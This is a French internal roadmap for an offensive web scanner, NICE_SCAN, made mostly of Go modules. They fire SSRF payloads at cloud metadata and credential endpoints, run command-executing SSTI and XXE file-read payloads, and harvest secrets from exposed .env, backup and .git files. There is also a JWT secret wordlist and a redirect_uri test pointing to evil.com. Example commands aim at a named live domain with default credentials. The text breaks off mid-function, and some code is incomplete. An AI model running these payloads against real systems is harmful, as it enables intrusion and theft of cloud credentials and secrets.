# NICE_SCAN — Roadmap Technique v2.0
> Document interne — NICE-DEV226 · Usage sur cibles autorisées uniquement

---

## Table des matières

1. [État actuel et lacunes critiques](#1-état-actuel-et-lacunes-critiques)
2. [Fix P0 — Faux positifs](#2-fix-p0--faux-positifs-baseline-comparison)
3. [Scan authentifié](#3-scan-authentifié--la-vraie-surface-dattaque)
4. [Nouvelles vulnérabilités critiques](#4-nouvelles-vulnérabilités-critiques-à-implémenter)
5. [Extraction de données réelle](#5-extraction-de-données-réelle)
6. [SSRF — Server-Side Request Forgery](#6-ssrf--server-side-request-forgery)
7. [SSTI — Template Injection](#7-ssti--server-side-template-injection)
8. [XXE — XML External Entity](#8-xxe--xml-external-entity)
9. [Race Conditions](#9-race-conditions)
10. [OAuth / JWT avancé](#10-oauth--jwt-avancé)
11. [Curl intégré dans le Shell](#11-curl-intégré-dans-le-shell)
12. [OOB amélioré](#12-oob-amélioré--out-of-band-detection)
13. [Recon avancé](#13-recon-avancé)
14. [Roadmap priorisée](#14-roadmap-priorisée)

---

## 1. État actuel et lacunes critiques

### Ce qui existe (v0.1.0)

| Module | Statut | Problème |
|--------|--------|----------|
| SQLi error-based | ✅ Implémenté | Pas de blind/time-based |
| SQLi UNION extract | ✅ Implémenté | Fonctionne si SQLi confirmé |
| LFI path traversal | ✅ Implémenté | Payloads B64 corrects |
| XSS reflected | ✅ Implémenté | Pas de DOM/stored |
| JWT forge (alg:none) | ✅ Implémenté | Liste secrets trop courte |
| CORS wildcard | ✅ Implémenté | OK |
| S3 public bucket | ✅ Implémenté | Limité à AWS |
| OOB server | ✅ Implémenté | localhost seulement, inutile en prod |
| WebShell upload | ✅ Implémenté | PHP uniquement |
| SSRF | ❌ Absent | Critique à ajouter |
| SSTI | ❌ Absent | Très commun |
| XXE | ❌ Absent | APIs XML/SOAP |
| Race Condition | ❌ Absent | Auth bypass fréquent |
| Deserialization | ❌ Absent | Java/PHP/Python |
| OAuth misconfig | ❌ Absent | Apps modernes |
| IDOR baseline | ❌ Broken | Faux positifs systématiques |
| Role escalation | ❌ Broken | Pas de comparaison baseline |

---

## 2. Fix P0 — Faux positifs (baseline comparison)

Problème actuel : le module IDOR et Role Escalation marquent `✓` sur tous les
paramètres même si le site retourne la même réponse pour tout.

### `internal/exploit/baseline.go` — nouveau fichier

```go
package exploit

import (
    "context"
    "math"

    "github.com/NICE-DEV226/nice-Scan/internal/transport"
    "github.com/NICE-DEV226/nice-Scan/internal/types"
)

type Baseline struct {
    StatusCode int
    BodySize   int
    BodyHash   string
}

// Faire une requête sans payload pour avoir une référence
func FetchBaseline(ctx context.Context, client *transport.Client, url string) (*Baseline, error) {
    resp, err := client.Do(ctx, &types.Request{Method: "GET", URL: url})
    if err != nil {
        return nil, err
    }
    return &Baseline{
        StatusCode: resp.StatusCode,
        BodySize:   len(resp.Body),
    }, nil
}

// Retourne true seulement si la réponse est vraiment différente
func IsDifferent(b *Baseline, statusCode, bodySize int) bool {
    if b == nil {
        return true
    }
    // Statut différent → suspect
    if statusCode != b.StatusCode {
        return true
    }
    // Différence de taille > 5% ET > 200 bytes → suspect
    diff := math.Abs(float64(bodySize - b.BodySize))
    pct := diff / float64(b.BodySize+1)
    return diff > 200 && pct > 0.05
}
```

### Application dans `internal/exploit/idor.go`

```go
// Avant la boucle d'énumération
baseline, err := FetchBaseline(ctx, client, fmt.Sprintf("%s?%s=0", target, param))
if err != nil {
    continue
}

// Dans la boucle
for i := start; i <= end; i++ {
    url := fmt.Sprintf("%s?%s=%d", target, param, i)
    resp, _ := client.Do(ctx, &types.Request{Method: "GET", URL: url})

    // FILTRE : ignorer si identique au baseline
    if !IsDifferent(baseline, resp.StatusCode, len(resp.Body)) {
        continue
    }

    findings = append(findings, Finding{
        Name:     fmt.Sprintf("IDOR: %s=%d", param, i),
        Severity: SevHigh,
        Evidence: fmt.Sprintf("Body size: %d vs baseline: %d", len(resp.Body), baseline.BodySize),
    })
}
```

---

## 3. Scan authentifié — la vraie surface d'attaque

Sans authentification, l'outil ne voit que la surface publique. La majorité
des vulnérabilités critiques sont derrière une authentification.

### Flags à ajouter dans le CLI

```
--bearer string      Bearer token (Authorization: Bearer <token>)
--api-key string     API key value
--api-key-header string  Header name (default: X-API-Key)
--session string     Cookie de session (ex: session=abc123)
--basic string       Basic auth (user:password)
```

### Exemples d'utilisation

```powershell
# Avec cookie de session (récupéré depuis le navigateur DevTools)
go run ./cmd/nice_scan hack https://memexa.tech --session "connect.sid=s%3Axxx"

# Avec JWT Bearer
go run ./cmd/nice_scan scan https://memexa.tech --bearer "eyJhbGciOiJIUzI1NiJ9..."

# Avec API key
go run ./cmd/nice_scan scan https://memexa.tech/api --api-key "sk_live_xxx" --api-key-header "X-API-Key"

# Basic auth
go run ./cmd/nice_scan scan https://memexa.tech --basic "admin:password123"
```

### `internal/transport/client.go` — modification

```go
type AuthConfig struct {
    BearerToken  string
    APIKey       string
    APIKeyHeader string // défaut: "X-API-Key"
    Cookie       string
    BasicUser    string
    BasicPass    string
}

func (c *Client) injectAuth(req *http.Request) {
    auth := c.cfg.Auth
    if auth == nil {
        return
    }
    if auth.BearerToken != "" {
        req.Header.Set("Authorization", "Bearer "+auth.BearerToken)
    }
    if auth.APIKey != "" {
        header := auth.APIKeyHeader
        if header == "" {
            header = "X-API-Key"
        }
        req.Header.Set(header, auth.APIKey)
    }
    if auth.Cookie != "" {
        req.Header.Set("Cookie", auth.Cookie)
    }
    if auth.BasicUser != "" {
        req.SetBasicAuth(auth.BasicUser, auth.BasicPass)
    }
}
```

---

## 4. Nouvelles vulnérabilités critiques à implémenter

---

## 5. Extraction de données réelle

### `internal/hacker/extract_deep.go` — nouveau fichier

Aller chercher les fichiers sensibles exposés et en extraire le contenu réel.

```go
package hacker

import (
    "context"
    "regexp"
    "strings"

    "github.com/NICE-DEV226/nice-Scan/internal/transport"
    "github.com/NICE-DEV226/nice-Scan/internal/types"
)

type DeepExtractAction struct{}

// Fichiers à scanner en priorité absolue
var sensitiveEndpoints = []string{
    // Environnement
    "/.env", "/.env.local", "/.env.production", "/.env.staging",
    "/.env.backup", "/.env.bak", "/env.json",

    // Config applicative
    "/config.json", "/config.yaml", "/config.yml",
    "/app.config.js", "/settings.json",
    "/appsettings.json",            // .NET
    "/wp-config.php",               // WordPress
    "/configuration.php",           // Joomla
    "/LocalSettings.php",           // MediaWiki
    "/config/database.yml",         // Rails

    // Debug / diagnostic
    "/api/debug", "/debug", "/__debug__",
    "/api/health", "/health", "/healthz",   // souvent expose DB status
    "/info", "/api/info",
    "/status", "/api/status",

    // Swagger / OpenAPI — expose TOUS les endpoints
    "/api/swagger.json", "/swagger.json",
    "/api/openapi.json", "/openapi.yaml",
    "/api-docs", "/v1/api-docs", "/v2/api-docs",
    "/swagger/v1/swagger.json",

    // Spring Boot Actuator — jackpot en entreprise
    "/actuator", "/actuator/env",
    "/actuator/configprops",
    "/actuator/mappings",
    "/actuator/httptrace",
    "/actuator/beans",
    "/actuator/health",

    // Laravel
    "/telescope/requests",
    "/horizon/api/jobs/failed",
    "/_debugbar/open",

    // Django
    "/django-admin/",
    "/api/schema/",

    // Git exposé
    "/.git/config",
    "/.git/HEAD",
    "/.git/COMMIT_EDITMSG",

    // Logs
    "/logs/error.log",
    "/logs/access.log",
    "/storage/logs/laravel.log",
    "/var/log/apache2/error.log",

    // Backups
    "/backup.zip", "/backup.sql", "/db.sql",
    "/dump.sql", "/database.sql",
    "/backup.tar.gz",
}

// Patterns d'extraction dans les corps de réponse
var extractPatterns = map[string]*regexp.Regexp{
    "aws_access_key":  regexp.MustCompile(`AKIA[0-9A-Z]{16}`),
    "aws_secret":      regexp.MustCompile(`(?i)aws.{0,20}secret.{0,20}[=:]["']?([A-Za-z0-9/+]{40})`),
    "stripe_live":     regexp.MustCompile(`sk_live_[0-9a-zA-Z]{24,}`),
    "stripe_test":     regexp.MustCompile(`sk_test_[0-9a-zA-Z]{24,}`),
    "sendgrid":        regexp.MustCompile(`SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}`),
    "twilio_sid":      regexp.MustCompile(`AC[a-z0-9]{32}`),
    "github_pat":      regexp.MustCompile(`ghp_[a-zA-Z0-9]{36}`),
    "github_oauth":    regexp.MustCompile(`gho_[a-zA-Z0-9]{36}`),
    "slack_token":     regexp.MustCompile(`xox[baprs]-[0-9a-zA-Z]{10,}`),
    "db_url_mysql":    regexp.MustCompile(`mysql://[^:]+:[^@]+@[^\s"']+`),
    "db_url_postgres": regexp.MustCompile(`postgres(ql)?://[^:]+:[^@]+@[^\s"']+`),
    "db_url_mongodb":  regexp.MustCompile(`mongodb(\+srv)?://[^:]+:[^@]+@[^\s"']+`),
    "db_url_redis":    regexp.MustCompile(`redis://[^:]*:[^@]*@[^\s"']+`),
    "private_key":     regexp.MustCompile(`-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----`),
    "jwt_secret":      regexp.MustCompile(`(?i)jwt[_-]?secret["'\s:=]+["']?([a-zA-Z0-9_-]{8,})`),
    "google_api":      regexp.MustCompile(`AIza[0-9A-Za-z_-]{35}`),
    "firebase":        regexp.MustCompile(`AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}`),
    "mailgun":         regexp.MustCompile(`key-[0-9a-zA-Z]{32}`),
    "heroku_api":      regexp.MustCompile(`[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}`),
    "ip_internal":     regexp.MustCompile(`(10\.\d+\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)`),
    "password_plain":  regexp.MustCompile(`(?i)(password|passwd|pwd|secret)\s*[=:]\s*["']?([^"'\s]{8,})`),
}

func (a *DeepExtractAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
    var findings []Finding
    base := strings.TrimRight(target, "/")

    for _, path := range sensitiveEndpoints {
        select {
        case <-ctx.Done():
            return ActionResult{Findings: findings}
        default:
        }

        url := base + path
        resp, err := client.Do(ctx, &types.Request{Method: "GET", URL: url})
        if err != nil || resp.StatusCode == 404 || resp.StatusCode == 403 {
            continue
        }

        body := string(resp.Body)

        // Le fichier est accessible — le sauvegarder
        if resp.StatusCode == 200 && len(body) > 10 {
            kb.ReportDir.WriteFile("exposed"+strings.ReplaceAll(path, "/", "_"), []byte(body))

            findings = append(findings, Finding{
                Type:        "exposed_file",
                Name:        "Fichier sensible exposé: " + path,
                Severity:    SevCritical,
                Description: url,
                Evidence:    body[:min(200, len(body))],
                Confidence:  0.95,
            })

            // Scanner le contenu pour des secrets
            for secretType, pattern := range extractPatterns {
                if match := pattern.FindString(body); match != "" {
                    kb.AddSecret(secretType + ": " + match)
                    findings = append(findings, Finding{
                        Type:        "secret_found",
                        Name:        "Secret extrait: " + secretType,
                        Severity:    SevCritical,
                        Description: "Trouvé dans " + path,
                        Evidence:    match,
                        Confidence:  0.9,
                    })
                }
            }
        }
    }

    return ActionResult{Findings: findings}
}

func min(a, b int) int {
    if a < b {
        return a
    }
    return b
}
```

---

## 6. SSRF — Server-Side Request Forgery

Vulnérabilité critique très commune dans les apps modernes (import d'URL,
webhooks, preview de liens, fetch d'images).

### `internal/hacker/ssrf.go` — nouveau fichier

```go
package hacker

import (
    "context"
    "fmt"
    "strings"

    "github.com/NICE-DEV226/nice-Scan/internal/transport"
    "github.com/NICE-DEV226/nice-Scan/internal/types"
)

type SSRFAction struct {
    oob *OOBServer
}

// Paramètres fréquemment vulnérables au SSRF
var ssrfParams = []string{
    "url", "uri", "link", "src", "source", "dest",
    "destination", "redirect", "redirect_to", "return",
    "return_to", "next", "callback", "fetch", "load",
    "path", "file", "reference", "ref", "image",
    "img", "proxy", "forward", "host", "endpoint",
    "webhook", "target", "import", "feed",
}

// Payloads SSRF — cibles metadata cloud en priorité
var ssrfPayloads = []struct {
    name    string
    payload string
    detect  string
}{
    // AWS IMDSv1 — accès aux credentials EC2
    {"AWS IMDSv1", "http://169.254.169.254/latest/meta-data/", "ami-id"},
    {"AWS credentials", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", ""},
    // GCP metadata
    {"GCP metadata", "http://metadata.google.internal/computeMetadata/v1/", ""},
    // Azure IMDS
    {"Azure IMDS", "http://169.254.169.254/metadata/instance", "azEnvironment"},
    // Docker socket
    {"Docker API", "http://localhost:2375/containers/json", "Id"},
    // Kubernetes API
    {"K8s API", "https://kubernetes.default.svc/api/v1/secrets", "items"},
    // Loopback services communs
    {"Internal Redis", "http://localhost:6379/", ""},
    {"Internal Elastic", "http://localhost:9200/_cat/indices", "index"},
    {"Internal Mongo", "http://localhost:27017/", ""},
    {"Internal Consul", "http://localhost:8500/v1/catalog/services", ""},
    // File:// LFI via SSRF
    {"SSRF→LFI /etc/passwd", "file:///etc/passwd", "root:"},
    {"SSRF→LFI win.ini", "file:///c:/windows/win.ini", "[fonts]"},
}

func (a *SSRFAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
    var findings []Finding

    // Récupérer les endpoints découverts
    endpoints := kb.GetEndpoints()
    pages := kb.GetPages()

    var testURLs []string
    for _, ep := range endpoints {
        testURLs = append(testURLs, target+ep.Path)
    }
    for _, p := range pages {
        if strings.Contains(p.URL, "?") {
            testURLs = append(testURLs, p.URL)
        }
    }

    for _, testURL := range testURLs {
        params := extractURLParams(testURL)
        for _, param := range params {
            // Tester uniquement les params suspects
            if !isSSRFParam(param) {
                continue
            }

            for _, payload := range ssrfPayloads {
                select {
                case <-ctx.Done():
                    return ActionResult{Findings: findings}
                default:
                }

                injectedURL := injectParam(testURL, param, payload.payload)
                resp, err := client.Do(ctx, &types.Request{
                    Method: "GET",
                    URL:    injectedURL,
                })
                if err != nil {
                    continue
                }

                body := string(resp.Body)

                // Vérifier si la réponse contient des données de la cible interne
                if payload.detect != "" && strings.Contains(body, payload.detect) {
                    kb.ReportDir.WriteFile(
                        fmt.Sprintf("ssrf_%s_%s.txt", param, payload.name),
                        resp.Body,
                    )
                    findings = append(findings, Finding{
                        Type:        "ssrf",
                        Name:        fmt.Sprintf("SSRF CRITIQUE: %s via param '%s'", payload.name, param),
                        Severity:    SevCritical,
                        Description: fmt.Sprintf("Le paramètre '%s' exécute des requêtes vers: %s", param, payload.payload),
                        Evidence:    body[:min(500, len(body))],
                        Confidence:  0.95,
                    })
                }
            }
        }
    }
    return ActionResult{Findings: findings}
}

func isSSRFParam(param string) bool {
    lower := strings.ToLower(param)
    for _, p := range ssrfParams {
        if strings.Contains(lower, p) {
            return true
        }
    }
    return false
}
```

---

## 7. SSTI — Server-Side Template Injection

Conduit directement à RCE dans Jinja2 (Python), Twig (PHP), Freemarker (Java),
ERB (Ruby), Pebble, etc.

### `internal/hacker/ssti.go` — nouveau fichier

```go
package hacker

import (
    "context"
    "fmt"
    "strings"

    "github.com/NICE-DEV226/nice-Scan/internal/transport"
    "github.com/NICE-DEV226/nice-Scan/internal/types"
)

type SSTIAction struct{}

// Payloads par moteur de template — le résultat attendu est 49 (7*7)
var sstiProbes = []struct {
    engine  string
    payload string
    expect  string
}{
    // Détection universelle
    {"Generic", "{{7*7}}", "49"},
    {"Generic", "${7*7}", "49"},
    {"Generic", "<%= 7*7 %>", "49"},
    {"Generic", "#{7*7}", "49"},
    {"Generic", "*{7*7}", "49"},

    // Jinja2/Flask (Python) — le plus fréquent
    {"Jinja2", "{{7*'7'}}", "7777777"},
    {"Jinja2", "{{config}}", "SECRET_KEY"},
    {"Jinja2 RCE", "{{''.__class__.__mro__[1].__subclasses__()[401]('id',shell=True,stdout=-1).communicate()[0].strip()}}", "uid="},

    // Twig (PHP — Laravel, Symfony)
    {"Twig", "{{7*7}}", "49"},
    {"Twig RCE", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "uid="},

    // Freemarker (Java)
    {"Freemarker", "${7*7}", "49"},
    {"Freemarker RCE", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "uid="},

    // ERB (Ruby on Rails)
    {"ERB", "<%= 7*7 %>", "49"},
    {"ERB RCE", "<%= `id` %>", "uid="},

    // Velocity (Java)
    {"Velocity", "#set($a=7*7)$a", "49"},

    // Smarty (PHP)
    {"Smarty", "{math equation='7*7'}", "49"},
    {"Smarty RCE", "{system('id')}", "uid="},

    // Moustache
    {"Moustache", "{{7*7}}", "49"},

    // Pebble (Java)
    {"Pebble RCE", "{{'' + 7 * 7}}", "49"},
}

func (a *SSTIAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
    var findings []Finding

    pages := kb.GetPages()

    for _, page := range pages {
        if !strings.Contains(page.URL, "?") {
            continue
        }
        params := extractURLParams(page.URL)

        for _, param := range params {
            for _, probe := range sstiProbes {
                select {
                case <-ctx.Done():
                    return ActionResult{Findings: findings}
                default:
                }

                injectedURL := injectParam(page.URL, param, probe.payload)
                resp, err := client.Do(ctx, &types.Request{Method: "GET", URL: injectedURL})
                if err != nil {
                    continue
                }

                body := string(resp.Body)

                if probe.expect != "" && strings.Contains(body, probe.expect) {
                    sev := SevHigh
                    if strings.Contains(probe.engine, "RCE") {
                        sev = SevCritical
                    }
                    findings = append(findings, Finding{
                        Type:        "ssti",
                        Name:        fmt.Sprintf("SSTI %s via param '%s'", probe.engine, param),
                        Severity:    sev,
                        Description: fmt.Sprintf("Template injection confirmée — moteur: %s", probe.engine),
                        Evidence:    fmt.Sprintf("Payload: %s → Réponse contient: %s", probe.payload, probe.expect),
                        Confidence:  0.92,
                    })
                }
            }
        }
    }
    return ActionResult{Findings: findings}
}
```

---

## 8. XXE — XML External Entity

Critique sur toutes les APIs qui acceptent du XML, les imports DOCX/SVG,
les parsers SAML, les flux RSS/Atom.

### `internal/hacker/xxe.go` — nouveau fichier

```go
package hacker

import (
    "context"
    "fmt"
    "strings"

    "github.com/NICE-DEV226/nice-Scan/internal/transport"
    "github.com/NICE-DEV226/nice-Scan/internal/types"
)

type XXEAction struct{}

var xxePayloads = []struct {
    name    string
    body    string
    detect  string
}{
    {
        "XXE Linux /etc/passwd",
        `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
        "root:",
    },
    {
        "XXE Windows win.ini",
        `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>`,
        "[fonts]",
    },
    {
        "XXE SSRF via HTTP",
        `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
        "ami-id",
    },
    {
        "XXE Billion Laughs (DoS test)",
        `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;">]><root>&lol3;</root>`,
        "", // juste vérifier qu'il n'y a pas d'erreur de parser
    },
    {
        "XXE PHP filter (code source)",
        `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>`,
        "PD9waHA", // base64 de "<?php"
    },
}

var xmlEndpointPatterns = []string{
    "/api/", "/soap", "/wsdl", "/xml", "/import",
    "/upload", "/parse", "/process", "/rss", "/atom",
    "/saml", "/oidc", "/auth/saml",
}

func (a *XXEAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
    var findings []Finding

    endpoints := kb.GetEndpoints()
    var xmlTargets []string

    for _, ep := range endpoints {
        for _, pattern := range xmlEndpointPatterns {
            if strings.Contains(strings.ToLower(ep.Path), pattern) {
                xmlTargets = append(xmlTargets, target+ep.Path)
                break
            }
        }
        // Endpoints qui acceptent application/xml
        if strings.Contains(ep.ContentType, "xml") {
            xmlTargets = append(xmlTargets, target+ep.Path)
        }
    }

    for _, targetURL := range xmlTargets {
        for _, payload := range xxePayloads {
            select {
            case <-ctx.Done():
                return ActionResult{Findings: findings}
            default:
            }

            resp, err := client.Do(ctx, &types.Request{
                Method: "POST",
                URL:    targetURL,
                Headers: map[string]string{
                    "Content-Type": "application/xml",
                },
                Body: []byte(payload.body),
            })
            if err != nil {
                continue
            }

            body := string(resp.Body)

            if payload.detect != "" && strings.Contains(body, payload.detect) {
                kb.ReportDir.WriteFile(
                    fmt.Sprintf("xxe_%s.txt", strings.ReplaceAll(payload.name, " ", "_")),
                    resp.Body,
                )
                findings = append(findings, Finding{
                    Type:        "xxe",
                    Name:        fmt.Sprintf("XXE CRITIQUE: %s", payload.name),
                    Severity:    SevCritical,
                    Description: fmt.Sprintf("XML External Entity injection sur %s", targetURL),
                    Evidence:    body[:min(300, len(body))],
                    Confidence:  0.97,
                })
            }
        }
    }
    return ActionResult{Findings: findings}
}
```

---

## 9. Race Conditions

Permettent de bypasser des contrôles de sécurité qui vérifient → agissent
(check-then-act). Exemple classique : racheter un code promo 50 fois,
retirer plus que son solde, créer plusieurs comptes premium.

### `internal/hacker/race.go` — nouveau fichier

```go
package hacker

import (
    "context"
    "fmt"
    "sync"
    "sync/atomic"
    "time"

    "github.com/NICE-DEV226/nice-Scan/internal/transport"
    "github.com/NICE-DEV226/nice-Scan/internal/types"
)

type RaceConditionAction struct{}

// Endpoints typiquement vulnérables aux race conditions
var raceTargetPatterns = []string{
    "/api/redeem", "/api/coupon", "/api/discount",
    "/api/transfer", "/api/withdraw", "/api/payment",
    "/api/vote", "/api/like", "/api/claim",
    "/api/register", "/api/signup",
    "/api/upgrade", "/api/subscribe",
    "/purchase", "/checkout",
}

func (a *RaceConditionAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
    var findings []Finding

    endpoints := kb.GetEndpoints()

    for _, ep := range endpoints {
        if !isRaceTarget(ep.Path) {
            continue
        }

        // Test race condition : 20 requêtes simultanées
        result := testRaceCondition(ctx, client, target+ep.Path, 20)
        if result.successCount > 1 {
            findings = append(findings, Finding{
                Type:        "race_condition",
                Name:        fmt.Sprintf("Race Condition: %s (%d succès simultanés)", ep.Path, result.successCount),
                Severity:    SevCritical,
                Description: "L'endpoint accepte plusieurs requêtes identiques simultanées — bypass de limites possible",
                Evidence:    fmt.Sprintf("%d requêtes ont retourné 200 en %v", result.successCount, result.duration),
                Confidence:  0.80,
            })
        }
    }
    return ActionResult{Findings: findings}
}

type raceResult struct {
    successCount int32
    duration     time.Duration
}

func testRaceCondition(ctx context.Context, client *transport.Client, url string, concurrency int) raceResult {
    var successCount int32
    var wg sync.WaitGroup
    start := time.Now()

    // Préparer toutes les goroutines avant de les lancer simultanément
    ready := make(chan struct{})

    for i := 0; i < concurrency; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            <-ready // attendre le signal simultané

            resp, err := client.Do(ctx, &types.Request{
                Method: "POST",
                URL:    url,
                Headers: map[string]string{"Content-Type": "application/json"},
                Body:   []byte(`{"amount":1}`),
            })
            if err == nil && resp.StatusCode == 200 {
                atomic.AddInt32(&successCount, 1)
            }
        }()
    }

    // Lancer toutes les goroutines en même temps
    close(ready)
    wg.Wait()

    return raceResult{
        successCount: int32(atomic.LoadInt32(&successCount)),
        duration:     time.Since(start),
    }
}

func isRaceTarget(path string) bool {
    for _, pattern := range raceTargetPatterns {
        if strings.Contains(strings.ToLower(path), strings.TrimPrefix(pattern, "/api")) {
            return true
        }
    }
    return false
}
```

---

## 10. OAuth / JWT avancé

### JWT — liste de secrets étendue + attaques avancées

```go
// internal/hacker/jwt.go — étendre commonSecrets
var commonSecrets = []string{
    // Defaults frameworks
    "secret", "secret123", "supersecret", "jwt_secret",
    "your-256-bit-secret", "your-secret-key",
    "changeme", "change_me", "changethis",
    "development", "staging", "production",
    "app_secret", "api_secret", "application_secret",

    // Defaults CMS / frameworks connus
    "laravel_jwt_secret", "symfony_secret",
    "rails_secret", "django_secret",
    "express_secret", "node_secret",

    // Strings vides et triviaux
    "", "null", "undefined", "none",
    "0", "1", "true", "false",

    // Patterns entreprise courants
    "MyS3cr3tK3Y", "Sup3rS3cr3t",
    "P@ssw0rd", "Admin1234",
    "jwt_dev_secret", "jwt_prod_secret",
}

// Attaque "alg confusion" RS256 → HS256
// Si le serveur accepte RS256, tester la signature avec la clé publique en HS256
func tryAlgConfusion(publicKey []byte, payload map[string]interface{}) string {
    // Modifier le header alg RS256 → HS256
    // Signer avec la clé publique comme secret HMAC
    // Le serveur qui valide en RS256 peut être trompé
    header := map[string]interface{}{
        "alg": "HS256",
        "typ": "JWT",
    }
    return forgeJWT(header, payload, publicKey)
}

// kid injection — si le header kid est un chemin ou une query SQL
var kidPayloads = []string{
    "../../../../dev/null",           // LFI via kid
    "' UNION SELECT 'secret'--",      // SQLi via kid
    "/proc/sys/kernel/randomize_va_space", // Linux
}
```

### OAuth misconfigurations

```go
// internal/hacker/oauth.go — nouveau fichier
var oauthChecks = []struct {
    name    string
    test    func(ctx context.Context, client *transport.Client, authURL string) *Finding
}{
    {
        "Open redirect via redirect_uri",
        func(ctx context.Context, client *transport.Client, authURL string) *Finding {
            // Tester redirect_uri=https://evil.com
            testURL := authURL + "?client_id=test&redirect_uri=https://evil.com&response_type=code"
            resp, _ := client.Do(ctx, &types.Request{Method: "GET", URL: testURL})
            if resp != nil && (resp.StatusCode == 302 || resp.StatusCode == 301) {
                location := resp.Headers.Get("Location")
                if strings.Contains(location, "evil.com") {
                    return &Finding{
                        Name:     "OAuth open redirect — redirect_uri non validé",
                        Severity: SevCritical,
                        Evidence: "Location: " + location,
                    }
                }
            }
            return nil
        },
    },
    {
        "State parameter missing (CSRF)",
        func(ctx context.Context, client *transport.Client, authURL string) *Finding {
            testURL := authURL + "?client_id=test&redirect_uri=" + authURL + "&response_type=code"
            resp, _ := client.Do(ctx, &types.Request{Method: "GET", URL: testURL})
            body := string(resp.Body)
            if !strings.Contains(body, "state") {
                return &Finding{
                    Name:     "OAuth manque paramètre state — CSRF possible",
                    Severity: SevHigh,
                }
            }
            return nil
        },
    },
}
```

---

## 11. Curl intégré dans le Shell

Ajouter la commande `req` dans le REPL pour faire des requêtes HTTP raw
sans quitter nice_scan.

### `internal/shell/shell.go` — ajouter la commande `req`

```go
case "req":
    // Usage: req GET https://target.com/api/users
    //        req POST https://target.com/api/login '{"email":"a","password":"b"}'
    //        req GET https://target.com/api/me --header "Authorization: Bearer xxx"
    if len(args) < 3 {
        fmt.Println("Usage: req <METHOD> <URL> [body] [--header key:value] [--cookie value]")
        continue
    }

    method := strings.ToUpper(args[1])
    url    := args[2]

    var body []byte
    var extraHeaders = make(map[string]string)

    // Parser les args restants
    for i := 3; i < len(args); i++ {
        switch args[i] {
        case "--header":
            if i+1 < len(args) {
                parts := strings.SplitN(args[i+1], ":", 2)
                if len(parts) == 2 {
                    extraHeaders[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
                }
                i++
            }
        case "--cookie":
            if i+1 < len(args) {
                extraHeaders["Cookie"] = args[i+1]
                i++
            }
        case "--json":
            extraHeaders["Content-Type"] = "application/json"
            extraHeaders["Accept"] = "application/json"
        default:
            // Corps de la requête
            body = []byte(args[i])
        }
    }

    // Injecter la session courante si disponible
    for k, v := range s.session.Headers {
        if _, exists := extraHeaders[k]; !exists {
            extraHeaders[k] = v
        }
    }

    resp, err := s.client.Do(ctx, &types.Request{
        Method:  method,
        URL:     url,
        Body:    body,
        Headers: extraHeaders,
    })

    if err != nil {
        fmt.Printf("  ✗ Error: %v\n", err)
        continue
    }

    // Afficher la réponse formatée
    fmt.Printf("\n  ← %d %s\n", resp.StatusCode, http.StatusText(resp.StatusCode))
    fmt.Printf("  Size: %d bytes\n\n", len(resp.Body))

    // Pretty-print si JSON
    var jsonBody interface{}
    if json.Unmarshal(resp.Body, &jsonBody) == nil {
        pretty, _ := json.MarshalIndent(jsonBody, "  ", "  ")
        fmt.Println("  " + string(pretty))
    } else {
        // Afficher le corps brut (tronqué)
        bodyStr := string(resp.Body)
        if len(bodyStr) > 1000 {
            bodyStr = bodyStr[:1000] + "\n  [... tronqué]"
        }
        fmt.Println("  " + strings.ReplaceAll(bodyStr, "\n", "\n  "))
    }
```

### Utilisation dans le shell

```
> shell
nice_scan> req GET https://memexa.tech/api/users
  ← 401 Unauthorized
  Size: 42 bytes
  {"error": "Authentication required"}

nice_scan> req GET https://memexa.tech/api/users --header "Authorization: Bearer eyJhbGc..."
  ← 200 OK
  Size: 1842 bytes
  [{"id":1,"email":"admin@memexa.tech","role":"admin"}, ...]

nice_scan> req POST https://memexa.tech/api/login '{"email":"admin@test.com","password":"admin"}' --json
  ← 200 OK
  {"token": "eyJhbGciOiJIUzI1NiJ9..."}

nice_scan> req GET https://memexa.tech/api/admin/users?role=admin --header "Authorization: Bearer {last_token}"
```

---

## 12. OOB amélioré — Out-of-Band Detection

Problème actuel : le serveur OOB écoute sur `localhost:9999` — inutile
pour détecter des callbacks depuis une vraie cible en prod.

### Solution : intégrer interact.sh (open source)

```go
// internal/hacker/oob_remote.go — nouveau fichier

// Option 1 : interact.sh (self-hostable)
// Lancer: docker run -it projectdiscovery/interactsh-server
const defaultInteractSH = "oast.fun" // serveur public interact.sh

type RemoteOOBClient struct {
    serverURL  string
    uniqueID   string
    pollURL    string
}

func NewRemoteOOB() *RemoteOOBClient {
    uid := generateUniqueID() // ex: "nice-abc123"
    return &RemoteOOBClient{
        serverURL: defaultInteractSH,
        uniqueID:  uid,
        pollURL:   fmt.Sprintf("https://interact.sh/poll?id=%s&secret=%s", uid, uid),
    }
}

func (o *RemoteOOBClient) CallbackURL() string {
